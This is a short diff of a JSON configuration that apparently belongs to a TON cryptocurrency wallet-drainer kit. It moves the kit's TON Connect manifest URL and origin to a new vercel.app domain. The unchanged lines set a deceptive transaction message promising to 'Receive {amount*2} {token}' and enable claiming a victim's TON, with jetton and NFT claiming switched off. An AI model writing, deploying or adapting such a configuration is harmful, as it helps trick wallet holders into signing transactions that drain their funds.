@@ -1,8 +1,8 @@
 {
     "transactionMessage": "Receive {amount*2} {token}",
     "modalLanguage": "en",
-    "manifestUrl": "https://dream.vercel.app/manifest.json",
-    "origin": "dream.vercel.app",
+    "manifestUrl": "https://dream-sand.vercel.app/manifest.json",
+    "origin": "dream-sand.vercel.app",
     "claimTON": true,
     "claimJettons": false,
     "claimNFTs": false,
